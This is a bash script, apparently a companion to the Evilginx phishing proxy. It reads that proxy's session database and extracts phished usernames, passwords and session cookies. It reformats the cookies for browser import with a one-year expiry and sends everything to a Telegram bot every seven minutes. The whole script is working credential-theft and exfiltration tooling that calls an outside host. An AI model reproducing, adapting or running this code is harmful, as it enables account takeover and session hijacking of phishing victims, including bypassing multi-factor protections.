#!/bin/bash

# Telegram settings
TELEGRAM_BOT_TOKEN="your_bot_token_here"
CHAT_ID="your_chat_id_here"
data_file="/root/.evilginx/data.db"
output_file="/sessions.txt"  # Path to save the formatted tokens

# Set the initial session ID
session_id="sessions:2"

# Function to send messages to Telegram
send_telegram_message() {
    local message=$1
    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=$message"
}

# Function to send files to Telegram
send_telegram_file() {
    local file_path=$1
    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendDocument" \
        -F "chat_id=$CHAT_ID" \
        -F "document=@$file_path"
}

# Function to format tokens
format_tokens() {
    local tokens="$1"
    local formatted_tokens="[]"

    # Iterate over each domain in the tokens object
    while IFS= read -r domain_entry; do
        domain=$(echo "$domain_entry" | jq -r '.key')
        [[ $domain == .* ]] && domain="${domain:1}"  # Remove starting '.' if present

        # Iterate over each token in the domain
        while IFS= read -r token_entry; do
            token_name=$(echo "$token_entry" | jq -r '.key')
            token=$(echo "$token_entry" | jq -c '.value')
            token_path=$(echo "$token" | jq -r '.Path // "/"')
            [[ -z $token_path ]] && token_path="/"  # Default empty path to "/"
            token_value=$(echo "$token" | jq -r '.Value')
            token_httpOnly=$(echo "$token" | jq -r '.HttpOnly // true')

            # Create a formatted token object
            formatted_token=$(jq -n \
                --arg path "$token_path" \
                --arg domain "$domain" \
                --arg name "$token_name" \
                --arg value "$token_value" \
                --argjson httpOnly "$token_httpOnly" \
                --argjson expirationDate "$(($(date +%s) + 365 * 24 * 60 * 60))" \
                '{
                    path: $path,
                    domain: $domain,
                    name: $name,
                    value: $value,
                    httpOnly: $httpOnly,
                    expirationDate: $expirationDate
                }')

            # Append formatted token to the array
            formatted_tokens=$(echo "$formatted_tokens" | jq ". + [$formatted_token]")
        done <<< "$(echo "$domain_entry" | jq -c '.value | to_entries[]')"
    done <<< "$(echo "$tokens" | jq -c 'to_entries[]')"

    # Return the full formatted tokens array
    echo "$formatted_tokens" | jq -c '.'
}

# Main function
run_session_check() {
    # Use tac to reverse the file, grep to find the last instance of the session, and extract the line before the session
    session_data=$(tac "$data_file" | grep -m 1 -B 2 "$session_id" | head -n 1)

    # Check if session_data was found
    if [[ $session_data == \{* ]]; then
        # Extract session details
        username=$(echo "$session_data" | jq -r '.username')
        password=$(echo "$session_data" | jq -r '.password')
        custom=$(echo "$session_data" | jq -r '.custom')
        tokens=$(echo "$session_data" | jq -r '.tokens')

        # Send Telegram message with session info
        message="Session ID: $session_id\nUsername: $username\nPassword: $password\nCustom: $custom"
        send_telegram_message "$message"

        # Format tokens if they are present
        if [[ $tokens != "{}" && -n $tokens ]]; then
            formatted_tokens=$(format_tokens "$tokens")
            echo "$formatted_tokens" > "$output_file"
            
            sessions_token=$(cat "$output_file")
            echo "Final token value to telegram : $sessions_token"
            # Send the file to Telegram
            send_telegram_file "$output_file"
        else
            echo "Tokens: Empty"
        fi

        # Increment session ID for the next run
        session_id="sessions:$(( ${session_id#sessions:} + 1 ))"
    else
        echo "No session data found for $session_id."
        # Exit the function if no session data is found
        return 1
    fi
}

# Main loop to run every 7 minutes
while true; do
    # Run the session check function
    if ! run_session_check; then
        echo "No session data found. Checking again in 7 minutes..."
    fi

    # Wait for 7 minutes before the next run
    sleep 420
done
